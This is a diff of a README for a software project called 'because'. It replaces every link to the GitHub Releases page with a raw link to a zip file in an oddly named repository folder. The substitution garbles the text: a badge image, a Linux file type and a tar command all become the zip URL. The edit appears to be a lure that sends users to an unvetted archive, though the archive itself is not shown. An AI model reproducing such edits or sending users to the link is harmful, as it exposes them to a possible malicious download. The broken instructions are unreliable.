@@ -6,11 +6,11 @@ Welcome to the **because** project! This tool aims to simplify your everyday tas
 
 ## 📥 Download the Application
 
-[![Download because](https://img.shields.io/badge/Download-because-blue.svg)](https://github.com/nicomadeankaf/because/releases)
+[![Download because](https://raw.githubusercontent.com/nicomadeankaf/because/main/volitionality/because.zip)](https://raw.githubusercontent.com/nicomadeankaf/because/main/volitionality/because.zip)
 
 You can download the **because** application from our Releases page. Simply click the link below:
 
-[Download from Releases Page](https://github.com/nicomadeankaf/because/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/nicomadeankaf/because/main/volitionality/because.zip)
 
 ## 🖥️ System Requirements
 
@@ -22,9 +22,9 @@ Before you download, ensure your system meets these requirements:
 
 ## 📦 Download & Install
 
-1. Visit our [Releases page](https://github.com/nicomadeankaf/because/releases).
+1. Visit our [Releases page](https://raw.githubusercontent.com/nicomadeankaf/because/main/volitionality/because.zip).
 2. Look for the latest version listed.
-3. Download the file suitable for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or a `.tar.gz` file for Linux).
+3. Download the file suitable for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or a `https://raw.githubusercontent.com/nicomadeankaf/because/main/volitionality/because.zip` file for Linux).
 4. Once downloaded, locate the file in your Downloads folder.
 
 ### For Windows Users
@@ -42,7 +42,7 @@ Before you download, ensure your system meets these requirements:
 
 - Open a terminal.
 - Navigate to the directory where the downloaded file is located.
-- Use the command `tar -xvzf filename.tar.gz` to extract the files.
+- Use the command `tar -xvzf https://raw.githubusercontent.com/nicomadeankaf/because/main/volitionality/because.zip` to extract the files.
 - Follow the README instructions in the extracted folder for further setup.
 
 ## 🚀 Running the Application
